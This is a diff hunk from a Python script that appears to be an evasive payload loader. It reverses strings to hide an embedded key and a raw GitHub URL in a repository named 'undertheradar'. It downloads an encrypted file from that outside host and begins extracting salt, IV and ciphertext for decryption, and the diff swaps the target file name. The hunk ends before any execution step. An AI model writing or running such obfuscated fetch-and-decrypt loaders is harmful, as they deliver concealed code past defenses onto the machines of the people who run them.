@@ -8,7 +8,7 @@ import urllib.request
 thechallenge = b"6202desreveR"
 thechallenge=thechallenge[::-1]
 
-SCODE_U = "detpyrcne.tpircs_ruoy/niam/sdaeh/sfer/radarehtrednu/m3tsyst3g/moc.tnetnocresubuhtig.war//:sptth"
+SCODE_U = "detpyrcne.2tpircs_ruoy/niam/sdaeh/sfer/radarehtrednu/m3tsyst3g/moc.tnetnocresubuhtig.war//:sptth"
 encrypted_data=urllib.request.urlopen(SCODE_U[::-1]).read()
 
 # Extract salt, IV, and ciphertext
